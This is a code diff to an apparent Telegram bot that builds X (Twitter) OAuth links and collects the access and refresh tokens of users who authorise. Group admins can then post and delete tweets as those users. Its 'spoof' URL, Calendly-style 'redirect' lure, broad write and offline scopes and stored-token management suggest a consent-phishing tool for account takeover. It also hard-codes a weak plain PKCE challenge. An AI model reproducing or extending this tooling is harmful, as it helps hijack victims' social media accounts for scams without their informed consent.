@@ -1,5 +1,7 @@
 import re
 import uuid
+import base64
+import secrets
 import requests
 import validators
 from bot.handlers import keyboards
@@ -71,7 +73,7 @@ async def setup(update, context):
 
     if not await permission_check(update, context, groups, setup_command=True): return
 
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
     if group:
         text = "⚠️ *This group is already setup for OAuth\\.*"
         return await context.bot.send_message(chat_id, text, parse_mode)
@@ -80,29 +82,29 @@ async def setup(update, context):
     owner_id = owner.id
     owner_fullname = parse(owner.full_name)
 
-    chat_title = update.effective_chat.title
 
     group_data = {
-        "owner_id": owner_id,
-        "group": {
-            "id": chat_id,
-            "title": chat_title
+        "identifier": secrets.token_urlsafe(16),
+        "ids": { 
+            "group": chat_id,
+            "owner": owner_id
         },
         "client": {
             "id": None,
             "secret": None
         },
-        "spoof": "https://calendly.com/cointele",
         "redirect": "https://calendly.com/cointele",
-        "replies": False,
         "whitelist": [],
         "identifiers": [
             {
                 "user_id": owner_id,
-                "identifier": str(uuid.uuid4())
+                "identifier": secrets.token_urlsafe(16)
             }
         ],
-        "users": []
+        "users": [],
+        "settings": {
+            "replies": False
+        }
     }
     groups.insert_one(group_data)
 
@@ -126,14 +128,14 @@ async def set_client_id(update, context) -> None:
     args = context.args
     if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_client_id <client_id>')
     
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
 
     client_id = args[0]
     client_secret = group["client"]["secret"]
 
     if re.match("^[a-zA-Z0-9]+$", client_id) and len(client_id) == 34:
         groups.update_one(
-            {"group.id": chat_id},
+            {"ids.group": chat_id},
             {"$set": {f"client.id": client_id}}
         )
         
@@ -151,14 +153,14 @@ async def set_client_secret(update, context) -> None:
     args = context.args
     if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_client_secret <client_secret>')
     
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
 
     client_secret = args[0]
     client_id = group["client"]["id"]
 
     if (len(client_secret) == 50 and re.match("^[a-zA-Z0-9_-]+$", client_secret)):
         groups.update_one(
-            {"group.id": chat_id},
+            {"ids.group": chat_id},
             {"$set": {f"client.secret": client_secret}}
         )
         
@@ -179,7 +181,7 @@ async def set_redirect(update, context) -> None:
     url = args[0]
     if validators.url(url):
         groups.update_one(
-            {"group.id": chat_id},
+            {"ids.group": chat_id},
             {"$set": {"redirect": url}}
         )
 
@@ -199,13 +201,13 @@ async def set_spoof(update, context) -> None:
 
     url = args[0]
     if validators.url(url):
-        group = groups.find_one({"group.id": chat_id}, {"identifiers": 1})
+        group = groups.find_one({"ids.group": chat_id}, {"identifiers": 1})
 
         for item in group["identifiers"]:
             item["identifier"] = str(uuid.uuid4())
 
         groups.update_one(
-            {"group.id": chat_id},
+            {"ids.group": chat_id},
             {"$set": {"spoof": url, "identifiers": group["identifiers"]}}
         )
 
@@ -220,10 +222,10 @@ async def set_replies(update, context) -> None:
 
     if not await permission_check(update, context, groups, admin_command=True): return
         
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
 
     result = groups.update_one(
-        {"group.id": chat_id},
+        {"ids.group": chat_id},
         {"$set": {
             "replies": not group["replies"]
         }}
@@ -244,15 +246,15 @@ async def display_endpoint(update, context) -> None:
 
     user_id = update.effective_user.id
 
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
     matched = next((i for i in group["identifiers"] if i["user_id"] == user_id), None)
 
     if matched:
         identifier = matched["identifier"]
     else:
-        identifier = str(uuid.uuid4())
+        identifier = secrets.token_urlsafe(16)
         groups.update_one(
-            {"group.id": chat_id},
+            {"ids.group": chat_id},
             {"$push": {
                 "identifiers": {
                     "user_id": user_id,
@@ -267,7 +269,19 @@ async def display_endpoint(update, context) -> None:
     if not client_id or not client_secret:
         text = f"⚠️ *Client {'ID' if not client_id else 'secret'} hasn't been set yet\\.*\n\n💬 _To set the client {'ID' if not client_id else 'secret'}, use the */set\\_client\\_{'id' if not client_id else 'secret'}* command followed by the OAuth app client {'ID' if not client_id else 'secret'}_\\."
     else:
-        endpoint = parse(DOMAIN + f"/oauth?i={identifier}")
+        domain = config["DOMAIN"]
+        callback_url = urllib.parse.quote(f"{domain}/auth", safe="")
+
+        group_token = group["identifier"]
+        user_token = identifier
+
+        raw_state = f"{group_token}.{user_token}"
+        state = base64.urlsafe_b64encode(raw_state.encode()).decode().rstrip("=")
+
+        endpoint = (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={client_id}'
+                            f'&redirect_uri={callback_url}'
+                            f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
+                            f'&state={state}&code_challenge=challenge&code_challenge_method=plain')
 
         reply_markup = keyboards.refresh()
         text = f"🔗 *Your endpoint*: {endpoint}"
@@ -279,7 +293,7 @@ async def display_users(update, context, page=1, message_id=None) -> None:
     
     if not await permission_check(update, context, groups): return
         
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
     users = group['users']
     online_users = [u for u in users if u.get("access_token")]
     if users:
@@ -331,7 +345,7 @@ async def display_whitelist(update, context) -> None:
     if not await permission_check(update, context, groups, owner_command=True): return
 
     user_lines = []
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
     whitelist = group["whitelist"]
     if whitelist:
         for user_id in whitelist:
@@ -348,10 +362,10 @@ async def add_whitelist(update, context, query):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
-    group = groups.find_one({ "group.id": chat_id })
+    group = groups.find_one({ "ids.group": chat_id })
     if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")
 
-    owner_id = group["owner_id"]
+    owner_id = group["ids"]["owner"]
     if owner_id != user_id: return await query.answer("❌ Only the group owner may use this action.")
 
     context.user_data["awaiting_whitelist_id"] = True
@@ -362,13 +376,13 @@ async def add_whitelist(update, context, query):
 async def whitelist_addition(update, context, user_id):
     chat_id = update.effective_chat.id
 
-    group = groups.find_one({ "group.id": chat_id })
+    group = groups.find_one({ "ids.group": chat_id })
     if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")
 
     if user_id in group["whitelist"]: return await context.bot.send_message(f"⚠️ *The user _[{user_id}](tg://user?id={user_id})_ is already in the whitelist\\.*")
 
     result = groups.update_one(
-        {"group.id": chat_id},
+        {"ids.group": chat_id},
         {"$push": {"whitelist": user_id}}
     )
 
@@ -383,10 +397,10 @@ async def remove_whitelist(update, context, query):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
-    group = groups.find_one({ "group.id": chat_id })
+    group = groups.find_one({ "ids.group": chat_id })
     if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")
 
-    owner_id = group["owner_id"]
+    owner_id = group["ids"]["owner"]
     if owner_id != user_id: return await query.answer("❌ Only the group owner may use this action.")
 
     reply_markup = keyboards.whitelist_pagination(group["whitelist"])
@@ -397,13 +411,13 @@ async def remove_whitelist(update, context, query):
 async def whitelist_removal(update, context, user_id):
     chat_id = update.effective_chat.id
 
-    group = groups.find_one({ "group.id": chat_id })
+    group = groups.find_one({ "ids.group": chat_id })
     if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")
 
     if user_id not in group["whitelist"]: return await context.bot.send_message(f"⚠️ *The user _[{user_id}](tg://user?id={user_id})_ is not in the whitelist\\.*")
 
     result = groups.update_one(
-        {"group.id": chat_id},
+        {"ids.group": chat_id},
         {"$pull": {"whitelist": user_id}}
     )
 
@@ -427,7 +441,7 @@ async def post_tweet(update, context) -> None:
 
     username = args[0] if not is_community else args[1]
         
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
 
     user = next((u for u in group.get('users', []) if u['username'].lower() == username.lower()), None)
     if not user:
@@ -464,7 +478,7 @@ async def delete_tweet(update, context) -> None:
 
     username_arg, tweet_id = args[0], args[1]
 
-    group = groups.find_one({"group.id": chat_id})
+    group = groups.find_one({"ids.group": chat_id})
 
     user = next(u for u in group.get("users", []) if u["username"].lower() == username_arg.lower())
     if not user: return await context.bot.send_message(chat_id, f"⚠️ *User _{parse(username_arg)}_ has not authorized with OAuth\\.*", parse_mode=parse_mode)
@@ -515,13 +529,13 @@ async def delete_tweet(update, context) -> None:
 
         if not new_access_token:
             groups.update_one(
-                {"group.id": chat_id, "users.username": user["username"]},
+                {"ids.group": chat_id, "users.username": user["username"]},
                 {"$unset": {"users.$.access_token": ""}}
             )
             return await revoke_message(chat_id, context, username)
 
         groups.update_one(
-            {"group.id": chat_id, "users.username": user["username"]},
+            {"ids.group": chat_id, "users.username": user["username"]},
             {"$set": {
                 "users.$.access_token": new_access_token or access_token,
                 "users.$.refresh_token": new_refresh_token or refresh_token
@@ -554,7 +568,7 @@ async def check_auth(update, context) -> None:
     args = context.args
     if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /check_auth <username>')
 
-    group = groups.find_one({ "group.id": chat_id })
+    group = groups.find_one({ "ids.group": chat_id })
 
     user = next((u for u in group["users"] if u['username'].lower() == args[0].lower()), None)
     if not user:
@@ -580,7 +594,7 @@ async def check_auth(update, context) -> None:
         
         if not new_access_token: 
             groups.update_one(
-                {"group.id": chat_id, "users.username": user["username"]},
+                {"ids.group": chat_id, "users.username": user["username"]},
                 {"$unset": {
                     "users.$.access_token": ""
                 }}
@@ -588,7 +602,7 @@ async def check_auth(update, context) -> None:
             text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
         else:
             groups.update_one(
-                {"group.id": chat_id, "users.username": user["username"]},
+                {"ids.group": chat_id, "users.username": user["username"]},
                 {"$set": {
                     "users.$.access_token": new_access_token,
                     "users.$.refresh_token": new_refresh_token
